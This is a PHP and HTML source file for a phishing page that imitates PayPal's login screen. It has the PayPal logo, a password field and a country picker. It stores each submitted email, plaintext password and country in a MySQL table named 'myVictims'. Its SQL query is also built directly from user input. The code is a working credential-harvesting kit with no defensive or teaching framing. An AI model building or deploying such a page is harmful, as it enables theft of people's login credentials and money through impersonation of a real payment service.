<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['email'])) {
    $email = $_POST['email'];
} else {
    header("Location: test1.php"); // Redirect back to the first page if accessed directly
    exit();
}

// Database connection
$servername = "localhost";
$username = "root";
$password = "";
$dbname = "Victims"; // Replace with your actual database name

$conn = new mysqli($servername, $username, $password, $dbname);

if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

if (isset($_POST['password']) && isset($_POST['country'])) {
    $password = $_POST['password'];
    $country = $_POST['country'];

    // Securely hash the password before storing it
    $hashedPassword = password_hash($password, PASSWORD_DEFAULT);

    $sql = "INSERT INTO myVictims (email, password, country) VALUES ('$email', '$password', '$country')";

    if ($conn->query($sql) === TRUE) {
        echo "New record created successfully";
    } else {
        echo "Error: " . $sql . "<br>" . $conn->error;
    }

    $conn->close();
} else {
?>




<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Document</title>
    <style>
      @import url("https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.6/css/bootstrap.min.css");
      html,
      body {
        height: 100%;
        margin: 0;
        padding: 0;
        box-sizing: border-box;
      }
      .cardContainer {
        width: 35%;
      }
      .card {
        display: flex;
        width: 100%;
        border: 1.5px solid #eaeced;
        align-items: center;
        justify-content: center;
        height: 42rem;
        border-radius: 15px;
      }
 /* Labtops ----------- */     
@media only screen and (max-width: 991px) {
    .cardContainer{
        width: 70%;
    }
}
 /* Tablets ----------- */
@media only screen and (max-width: 767px) {
    .cardContainer{
        width: 60%;
    }
}
 /* Smartphones ----------- */
@media only screen and (max-width: 575px) {
    .cardContainer{
        width: 100%;
    }
    .card{
        border: 0;
    }
}
      .paypal-logo {
        position: absolute;
        top: 35px;
      }
      .textInput {
        width: 75%;
        min-height: 64px;
        line-height: 24px;
        align-items: center;
        border: 1px solid #9da3a6;
        border-radius: 4px;
        text-indent: 10px;
        margin-top: 1.5rem;
      }

      input::-webkit-input-placeholder { /* WebKit browsers */
  line-height: 1.5em;
}
input:-moz-placeholder { /* Mozilla Firefox 4 to 18 */
  line-height: 1.5em;
}
input::-moz-placeholder { /* Mozilla Firefox 19+ */
  line-height: 1.5em;
}
input:-ms-input-placeholder { /* Internet Explorer 10+ */
  line-height: 1.5em;
}
      .fogot-email {
        color: #0070e0;
        text-decoration: none;
        font-weight: bold;
        font-size: 14px;
        font-family: sans-serif;
        align-self: flex-start;
        margin-left: 12.5%;
        margin-top: 20px;
      }
      .blueBtn {
        width: 75%;
        height: 48px;
        min-width: 6rem;
        padding: 0.75rem 2rem;
        background-color: #0544b5;
        border: 0 solid #0544b5;
        color: #fff;
        border-radius: 100px;
        font-weight: 600;
        margin: 0;
        font-size: 1rem;
        font-style: normal;
        margin-top: 40px;
        cursor: pointer;
        display: flex;
        align-items: center;
        justify-content: center;
      }
      .ortxtContainer {
        border: 0.5px outset #eaeced;
        width: 75%;
        margin-top: 2rem;
        justify-content: center;
        align-items: center;
        display: flex;
      }
      .orText {
        position: absolute;
        background-color: #fff;
        width: 1.5rem;
        height: 1.5rem;
        align-items: center;
        justify-content: center;
        display: flex;
        border-radius: 20px;
        flex-direction: column;
        margin-top: 10px;
      }
      .orText p {
        font-weight: 500;
        color: #9da3a6;
      }

      .signUpBtn {
        margin-top: 30px;
        width: 75%;
        height: 48px;
        border: 1px solid black;
        border-radius: 50px;
        font-weight: 600;
        background-color: transparent;
        cursor: pointer;
      }
      .country-selector {
    margin-top: 50px;
}
      #selected-country {
    display: inline-flex;
    align-items: center;
    gap: 11px;
    padding: 10px;
    /* background-color: #fff; */
    /* border: 1px solid #ddd; */
    /* border-radius: 5px; */
    cursor: pointer;
    position: relative;
}


.flag {
    width: 25px;
    height: 15px;
    border: 1px solid #eaeced;
}

.dropdown-arrow {
    font-size: 16px;
    /* margin-left: 1px; */
    margin-top: 10px;
}

/* Modal styles */
.modal {
    display: none;
    position: fixed;
    z-index: 1;
    left: 0;
    top: 0;
    width: 100%;
    height: 100%;
    background-color: rgba(0, 0, 0, 0.5);
    animation: H1Ani forwards 1s ease;  
    opacity: 0;    
    animation-delay: .2s;  
}
@keyframes H1Ani {
    0%{
        transform: translateY(100px) ;
        opacity: 0;
    }    
    100%{
        transform: translateY(0) ;
        opacity: 1;
    }    
}
.modal-content {
    background-color: #fff;
    margin: 0 auto;
    padding: 20px;
    padding-left: 10%;
    padding-right: 10%;
    width: 100%;
    max-width: 100%;
    height: 100%;
    overflow-y: auto;
    box-sizing: border-box;
    position: relative;
}

.close {
    color: #aaa;
    float: right;
    font-size: 28px;
    font-weight: bold;
    cursor: pointer;
    position: fixed;
    right: 10%;
    top: 20px;
}

.close:hover {
    color: #000;
}

#country-list {
    display: flex;
    flex-wrap: wrap;
    gap: 10px;
}

.country-item {
    display: flex;
    align-items: center;
    gap: 10px;
    padding: 10px;
    cursor: pointer;
    /* border: 1px solid #ddd; */
    border-radius: 5px;
    /* background-color: #f6f6f6; */
    width: calc(33.3333% - 20px);
    box-sizing: border-box;
    transition: background-color 0.3s;
}

.country-item:hover {
    background-color: #e0e0e0;
}

.country-item img {
    width: 20px;
}

/* Mobile layout: column list */
@media (max-width: 768px) {
    .country-item {
        width: 100%; /* Full width on mobile */
    }
}

h3 {
    margin-top: 0;
    text-align: center;
}
      footer {
        background-color: #f7f9fa;
        width: 100%;
        height: 3rem;
        align-items: center;
        justify-content: center;
        display: flex;
      }
      .footerLinks {
        display: flex;
        flex-direction: row;
        gap: 8px;
      }
      .footerLinks a {
        color: #545d68;
        font-size: 11px;
        font-weight: 500;
        font-family: sans-serif;
        text-decoration: none;
      }

    </style>
  </head>
  <body>
  <form action="page2.php" method="POST" >
    <div class="h-100 d-flex align-items-center justify-content-center">
      <div class="cardContainer">
        <div class="card justify-content-center">
          <svg
            class="paypal-logo"
            xmlns="http://www.w3.org/2000/svg"
            width="25"
            height="35"
            viewBox="0 0 256 302"
          >
            <path
              fill="#27346a"
              d="M217.168 23.507C203.234 7.625 178.046.816 145.823.816h-93.52A13.39 13.39 0 0 0 39.076 12.11L.136 259.077c-.774 4.87 2.997 9.28 7.933 9.28h57.736l14.5-91.971l-.45 2.88c1.033-6.501 6.593-11.296 13.177-11.296h27.436c53.898 0 96.101-21.892 108.429-85.221c.366-1.873.683-3.696.957-5.477q-2.334-1.236 0 0c3.671-23.407-.025-39.34-12.686-53.765"
            />
            <path
              fill="#27346a"
              d="M102.397 68.84a11.7 11.7 0 0 1 5.053-1.14h73.318c8.682 0 16.78.565 24.18 1.756a102 102 0 0 1 6.177 1.182a90 90 0 0 1 8.59 2.347c3.638 1.215 7.026 2.63 10.14 4.287c3.67-23.416-.026-39.34-12.687-53.765C203.226 7.625 178.046.816 145.823.816H52.295C45.71.816 40.108 5.61 39.076 12.11L.136 259.068c-.774 4.878 2.997 9.282 7.925 9.282h57.744L95.888 77.58a11.72 11.72 0 0 1 6.509-8.74"
            />
            <path
              fill="#2790c3"
              d="M228.897 82.749c-12.328 63.32-54.53 85.221-108.429 85.221H93.024c-6.584 0-12.145 4.795-13.168 11.296L61.817 293.621c-.674 4.262 2.622 8.124 6.934 8.124h48.67a11.71 11.71 0 0 0 11.563-9.88l.474-2.48l9.173-58.136l.591-3.213a11.71 11.71 0 0 1 11.562-9.88h7.284c47.147 0 84.064-19.154 94.852-74.55c4.503-23.15 2.173-42.478-9.739-56.054c-3.613-4.112-8.1-7.508-13.327-10.28c-.283 1.79-.59 3.604-.957 5.477"
            />
            <path
              fill="#1f264f"
              d="M216.952 72.128a90 90 0 0 0-5.818-1.49a110 110 0 0 0-6.177-1.174c-7.408-1.199-15.5-1.765-24.19-1.765h-73.309a11.6 11.6 0 0 0-5.053 1.149a11.68 11.68 0 0 0-6.51 8.74l-15.582 98.798l-.45 2.88c1.025-6.501 6.585-11.296 13.17-11.296h27.444c53.898 0 96.1-21.892 108.428-85.221c.367-1.873.675-3.688.958-5.477q-4.682-2.47-10.14-4.279a83 83 0 0 0-2.77-.865"
            />
          </svg>
          <input
            type="text"
            placeholder="Enter address or mobile number"
            class="textInput"
            name="email"
            value="<?php echo htmlspecialchars($email); ?>" disabled
          />
          <input type="hidden" name="email" value="<?php echo htmlspecialchars($email); ?>"><br>
           <input
          type="password"
          placeholder="Enter address or mobile number"
          class="textInput"
          name="password"
        />
        <a href="#" class="fogot-email">Forgot email?</a>
          <button class="blueBtn">Next</button>
          <span class="ortxtContainer">
            <div class="orText">
              <p>or</p>
            </div>
          </span>
          <button class="signUpBtn">Signup</button>

          <div class="country-selector">
            <div id="selected-country" onclick="openModal()">
                <img src="https://flagcdn.com/w20/gb.png" alt="Flag" class="flag">
                <!-- <span id="country-name">United Kingdom</span> -->
                <span class="dropdown-arrow">
                    <svg xmlns="http://www.w3.org/2000/svg" width="13" height="13" viewBox="0 0 1024 1024"><path fill="currentColor" d="M8.2 275.4c0-8.6 3.4-17.401 10-24.001c13.2-13.2 34.8-13.2 48 0l451.8 451.8l445.2-445.2c13.2-13.2 34.8-13.2 48 0s13.2 34.8 0 48L542 775.399c-13.2 13.2-34.8 13.2-48 0l-475.8-475.8c-6.8-6.8-10-15.4-10-24.199"/></svg>
                </span>
            </div>
            <input type="hidden" id="selected-country-name" name="country" value="United Kingdom">
        </div>

         <!-- Country Selection Modal -->
    <div id="countryModal" class="modal">
        <div class="modal-content">
            <span class="close" onclick="closeModal()">&times;</span>
            <!-- <h3>Select Your Country</h3> -->
            <div id="country-list"></div>
        </div>
    </div>


        </div>
      </div>
    </div>
</form>
    <footer>
      <div class="footerLinks">
        <a href="#">Contact Us</a>
        <a href="#">Privacy</a>
        <a href="#">Legal</a>
        <a href="#">Worldwide</a>
      </div>
    </footer>

    <script>
        // Array of countries with their codes and names
     const countries = [
         { code: 'us', name: 'United States' },
         { code: 'gb', name: 'United Kingdom' },
         { code: 'ca', name: 'Canada' },
         { code: 'fr', name: 'France' },
         { code: 'de', name: 'Germany' },
         { code: 'jp', name: 'Japan' },
         { code: 'cn', name: 'China' },
         { code: 'in', name: 'India' },
         // Add more countries as needed
     ];
     
     // Function to open the modal
     function openModal() {
         const modal = document.getElementById('countryModal');
         modal.style.display = 'block';
         populateCountryList();
     }
     
     // Function to close the modal
     function closeModal() {
         const modal = document.getElementById('countryModal');
         modal.style.display = 'none';
     }
     
     // Function to populate the country list in the modal
     function populateCountryList() {
         const list = document.getElementById('country-list');
         list.innerHTML = '';
     
         countries.forEach(country => {
             const listItem = document.createElement('div');
             listItem.className = 'country-item';
             listItem.innerHTML = `
                 <img src="https://flagcdn.com/w20/${country.code}.png" alt="${country.name} Flag">
                 ${country.name}
             `;
             listItem.onclick = () => selectCountry(country);
             list.appendChild(listItem);
         });
     }
     
     // Function to select a country and update the default
     function selectCountry(country) {
         const flagImg = document.querySelector('#selected-country .flag');
         
         flagImg.src = `https://flagcdn.com/w20/${country.code}.png`;
         flagImg.alt = `${country.name} Flag`;
     
         // Update the hidden input with the selected country name
    const countryInput = document.getElementById('selected-country-name');
    countryInput.value = country.name;
         // Close the modal after the country is selected
         closeModal();
     }
     
     // Default selection (can use geolocation or set manually)
     window.onload = function() {
         const userCountry = countries.find(c => c.code === 'gb') || countries[0];
         selectCountry(userCountry);
     };
     
     // Close the modal if the user clicks outside of the modal content
     window.onclick = function(event) {
         const modal = document.getElementById('countryModal');
         if (event.target == modal) {
             closeModal();
         }
     }
     
         </script>
  </body>
</html>
<?php
}
?>